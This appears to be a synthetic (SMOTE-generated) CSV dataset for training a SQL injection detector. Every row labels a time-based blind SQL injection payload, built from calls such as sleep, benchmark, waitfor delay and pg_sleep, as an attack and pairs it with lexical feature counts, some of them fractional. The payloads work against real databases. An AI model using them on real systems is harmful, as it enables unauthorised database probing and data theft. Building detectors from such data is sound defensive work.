id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000062,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000043,0.055586170921989864,68.11885594421223,24.059427972106114,3.657419247990658,16.98019067596463,19.039618648070743,24.079237296141486,8.019809324035371,0.2493307660798861,0.2794983714484853,0.35344507024573285,0.11772579222589574,0.0,1.0,0.0,0.0,0.0,1.0,0.0,4.019809324035371,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.019809324035371167,0.9801906759646288,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
SMOTE_000063,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000043,0.008139863608944625,68.0549718776846,24.0,3.6554182689339716,17.0,19.0,24.04397750214767,8.010994375536917,0.2498117401449158,0.27920135663255297,0.3532778293879153,0.11770907383461597,0.0,1.0,0.0,0.0,0.0,1.0,0.0,4.010994375536917,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
SMOTE_000064,attack,time,1   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000220,0.01883550180277581,89.93071576960484,18.029693241597926,2.7216777037623308,27.039590988797233,2.0,48.91092027520622,11.980204505601382,0.30072742479416603,0.022240772216973265,0.5438256696195345,0.13320613336932616,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,9.980204505601384,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000065,attack,time,"1"" waitfor delay '0:0:5'",nearest_attack_euclidean,R000196,0.9501813999374459,22.89669519298645,17.264463461990964,4.002984148222971,12.0,3.632231730995481,2.632231730995482,4.632231730995482,0.5262691620717513,0.15791027930941623,0.11405451580343695,0.2017660428153955,2.0,0.6322317309954817,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.6322317309954817,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
SMOTE_000066,attack,time,1  )   where 2468  =  2468 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000173,0.2206199401062871,104.09519343659727,28.0,3.3273633496905037,33.0,10.0,49.0,12.095193436597267,0.31702001983445877,0.09606667267710874,0.47072669611783274,0.1161866113705997,0.0,0.09519343659726764,0.0,0.0,1.0,1.0,0.0,9.0,0.0,0.0,0.0,2.0,0.0,0.09519343659726776,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000067,attack,time,select pg_sleep  (  5  )   and    (    (     (  9476  =  9476,nearest_attack_euclidean,R000202,1.0327330370906247,58.39852647574099,19.02444742840287,3.085656737790787,15.349631618935247,9.0,27.699263237870493,6.349631618935247,0.26289857876374706,0.15478294516496477,0.4742028424725059,0.10811563359878229,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.674815809467623,0.0,0.6748158094676232,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3251841905323768,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3251841905323767
SMOTE_000068,attack,time,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000103,0.892230853183542,83.52941577863649,26.0,3.5066088844134926,19.77451314886374,18.0,35.509805259545494,10.245097370227253,0.236145329307826,0.21570670379516654,0.4252084108757191,0.1229395560212884,0.0,0.2450973702272523,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,4.0,0.0,0.24509737022725236,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.24509737022725242,0.7549026297727476,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000069,attack,time,waitfor delay '0:0:5',nearest_attack_euclidean,R000308,1.332221922824141,22.46043670837095,16.58417468334838,3.948507716213528,12.0,3.292087341674189,2.2920873416741934,4.876262025022567,0.5393310613544847,0.14606689386455152,0.10112263875167776,0.21347940602928592,2.292087341674189,-1.1102230246251565e-16,0.5841746833483776,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5841746833483779,1.0,0.0,0.2920873416741888,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
SMOTE_000070,attack,time,1'+  (  select iowv where 6105  =  6105 and sleep  (  5  )  #,nearest_attack_euclidean,R000143,1.8223135340082623,74.86417135418334,26.0,3.7158443112999158,24.341694002017743,13.577850672047314,27.261238676082797,9.683388004035486,0.3348124363821927,0.17811959683767867,0.3604397649328583,0.12662820184727036,1.8944626680118284,-1.1102230246251565e-16,0.0,0.0,0.0,1.4472313340059142,0.0,3.8944626680118284,0.0,0.0,0.44723133400591414,2.4472313340059144,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000071,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol,nearest_attack_euclidean,R000049,1.1908710089587926,99.75986466215826,27.039941998067828,3.4835394828974713,32.019970999033916,10.0,44.39990333011305,13.339990333011304,0.32142360602427,0.10066647545904561,0.4439243230528489,0.1339855954638355,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.6600096669886955,0.0,6.679980666022609,0.0,1.0,0.0,1.6600096669886955,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.6600096669886955,0.33999033301130455,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000072,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000172,0.3560629778347529,62.57898881165395,25.786186800728373,4.012613224665341,21.717120804370232,12.0,19.28949440582697,9.572373601456743,0.346670675884968,0.19425822250307656,0.30574177749692344,0.153329324115032,2.786186800728372,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,1.7861868007283719,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000073,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,nearest_attack_euclidean,R000057,1.1364505872737551,88.02533745044714,27.789865019821143,3.7540078463167066,33.092398764865855,10.0,34.02533745044714,10.907601235134143,0.37770803983881057,0.11390051089727908,0.38493724115469297,0.12345420810921742,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.3025337450447143,0.0,4.605067490089429,0.0,1.0,0.0,1.3025337450447143,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.3025337450447143,0.6974662549552859,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000074,attack,time,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag",nearest_attack_euclidean,R000026,1.1272437800422554,120.29881480658685,28.432938268862284,3.312512598499359,23.731753075449138,21.0,58.0,17.567061731137716,0.19668631219852575,0.17465551788168993,0.4823819065303817,0.14627626338940253,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,0.5670617311377153,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000075,attack,time,select pg_sleep  (  5  )   and 'rpka'  =  'rpka,nearest_attack_euclidean,R000063,1.091624578105056,44.39053903569153,18.627219862241645,3.5176577969367653,21.017758897933177,1.0,15.0,7.372780137758353,0.46939453795013963,0.022664606895908754,0.3399691034386314,0.16797175171532017,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.0,0.37278013775835306,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
SMOTE_000076,attack,time,begin dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000033,3.8481483750157315,32.34223521137985,17.65776478862015,3.5349677943611613,14.868117840113678,1.0,10.684470422759706,5.78964694850647,0.4656085571524542,0.030984596573643414,0.32683178502325616,0.17657506125064626,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.4474117371266173,0.0,2.3422352113798524,0.0,2.220446049250313e-16,0.0,0.0,0.0,0.4474117371266175,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4474117371266174,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4474117371266177
SMOTE_000077,attack,time,"1'   )    )    as agdn where 8442  =  8442 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000185,0.21184616465029454,108.15736048837991,30.0,3.808393896032003,26.0,30.0,40.42059470432564,11.736765784054272,0.24059211185367363,0.277606282908085,0.3733147640744805,0.1084868411637609,1.0,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,5.736765784054273,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000078,attack,time,"1   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  8671  =  8671",nearest_attack_euclidean,R000071,0.22371265838220586,118.08454308936874,25.0,3.182053139882475,18.0,29.08454308936873,58.0,13.0,0.15243399974301117,0.24629855682622254,0.49117622139414713,0.11009122203661917,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0845430893687298,0.9154569106312702,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000079,attack,time,"1%""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000167,0.4331666042428606,124.0900593475263,23.0,2.7994832500638998,31.0,2.0,69.87204747802105,21.21801186950526,0.2502124046760252,0.01614273578555002,0.5627017839524149,0.17094307558600996,0.0,4.0,0.0,0.0,1.0,1.0,0.0,13.218011869505261,2.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000080,attack,time,"1'+  (  select 'wkcq' where 1020  =  1020 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000223,0.9974383666563886,107.6268245206349,32.6268245206349,4.0337000227324,31.3731754793651,28.253649041269803,35.0,13.0,0.29152573482448496,0.2624797668188583,0.3252043217183955,0.12079017663826118,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,1.0,0.0,0.6268245206349027,0.3731754793650973,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000081,attack,time,"1'  )   where 4778  =  4778 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000231,0.38691140262774315,79.88681035222423,24.419291189383163,3.4046637779974276,17.0482279734579,18.0,34.52411398672895,10.314468392037371,0.21201560046663043,0.22623362896099947,0.4327897087325367,0.1289610618398334,1.1048227973457903,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,5.10482279734579,0.0,0.0,1.0,2.2096455946915805,1.0,0.0,0.0,0.8951772026542097,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.10482279734579036,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1048227973457903
SMOTE_000082,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""gixv""  =  ""gixv",nearest_attack_euclidean,R000178,0.10454131545601313,109.814178581323,26.939690475457557,3.272302411488679,38.09046428681367,2.0,53.60309524542444,16.120619049084887,0.34720195771535456,0.018238777849254872,0.48776213686866876,0.14679712756672186,0.0,4.0,0.0,0.0,1.0,1.0,0.0,10.120619049084889,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.9698452377287778,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.969845237728778
SMOTE_000083,attack,time,"1"" waitfor delay '0:0:5'",nearest_attack_euclidean,R000196,0.9567692648750931,22.889045682004486,17.25936378800299,4.002633846751115,12.0,3.6296818940014948,2.6296818940014965,4.629681894001495,0.5264512932856075,0.15784956890479748,0.11397862779766355,0.20172051001193148,2.0,0.6296818940014949,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.6296818940014948,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
SMOTE_000084,attack,time,"1""   )    )     )   and sleep  (  5  )  #",nearest_attack_euclidean,R000247,0.6307614282799638,38.437604101733655,13.802892623210282,2.4950217190247272,7.802892623210283,2.0,22.028926232102812,6.605785246420562,0.20593881945797238,0.053244592157258436,0.5685396141764874,0.17227697420828178,0.0,1.0,0.0,0.0,0.0,0.0,0.0,4.605785246420563,0.0,0.0,0.0,2.220446049250313e-16,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8028926232102813,0.19710737678971868,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
SMOTE_000085,attack,time,1'  )   where 4364  =  4364 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000127,1.172706695598306,88.45670872695325,28.728354363476626,3.6993059503643506,24.576118121158874,18.0,35.3044724846355,10.576118121158874,0.27795850431178104,0.20372065196054834,0.3988117353852049,0.11950910834246566,1.0,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,4.576118121158874,0.0,1.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.5761181211588746,0.4238818788411254,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000086,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'uzmy' like 'uzmy,nearest_attack_euclidean,R000266,0.9459512745335905,136.19212553191872,25.9228340425583,3.0295579132926673,43.38425106383745,2.0,71.53858297872085,19.269291489360427,0.31838962560242884,0.014686553488188384,0.5253919247912914,0.14153189611809142,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,0.2692914893604248,0.0,14.0,0.0,0.0,0.0,1.2692914893604246,1.0,0.0,0.0,0.0,0.0,0.2692914893604247,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.2692914893604246,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.269291489360424
SMOTE_000087,attack,time,1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,nearest_attack_euclidean,R000148,1.1568062479236059,61.0268302148822,23.6756100716274,3.7110175726337684,21.6756100716274,10.0,21.324389928372597,8.026830214882203,0.3551934280244643,0.16395071018348223,0.34979462576450926,0.13106123602754421,2.351220143254802,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,1.675610071627401,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.6756100716274009,0.0,1.0,0.0,0.0,0.6756100716274009,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.351220143254802
SMOTE_000088,attack,time,"1""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000083,1.7452657845377602,80.46237133182748,27.807796416478435,3.8106191849978224,21.654574915349052,21.403898208239216,28.0,9.403898208239218,0.26351960997396245,0.26789469511131003,0.35120924965598055,0.11737644525874696,0.0,2.211694624717654,0.0,0.0,0.0,1.0,0.0,4.596101791760782,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.596101791760782,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.4038982082392182,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4038982082392177
SMOTE_000089,attack,time,select sleep  (  5  )   and    (    (   'ilcv'  =  'ilcv,nearest_attack_euclidean,R000094,0.38628963443728154,58.556294104631675,17.0,3.0366693054700415,22.0,1.0,26.963578420526392,8.59271568410528,0.3786421979585491,0.017211008998115868,0.4575596368744702,0.1465871561688648,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.592715684105278,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000090,attack,time,"1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000267,0.7165055092897056,77.42994991422133,26.734300024508194,3.619135268917977,17.101450036762287,21.367150012254093,30.69564988971313,8.265699975491808,0.22212958977969893,0.2767710706817945,0.3946975503584804,0.10640178918002614,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,5.265699975491807,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
SMOTE_000091,attack,time,"select sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000039,1.2355354373522125,60.60687430245379,16.400237044912203,2.740461323906259,16.001185224561,1.400237044912199,32.60450385333179,10.600948179648798,0.2688544834560795,0.02250254863899634,0.5317762509816623,0.17686671692326192,0.0,3.4002370449121995,0.0,0.0,0.0,1.0,0.0,5.600948179648799,0.5997629550878004,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5997629550878005,0.0,0.0,0.0,1.4002370449121995,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000092,attack,time,1' rlike sleep  (  5  )   and 'ojqz' like 'ojqz,nearest_attack_euclidean,R000310,0.4613400694158189,48.83096593818251,19.816903406181748,3.647489102958959,25.183096593818252,1.8169034061817495,15.64786934436426,6.183096593818251,0.5180408329432232,0.03797406801574363,0.31721401121708287,0.12677108782395025,3.816903406181749,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.3661931876365023,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.18309659381825094,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.183096593818251
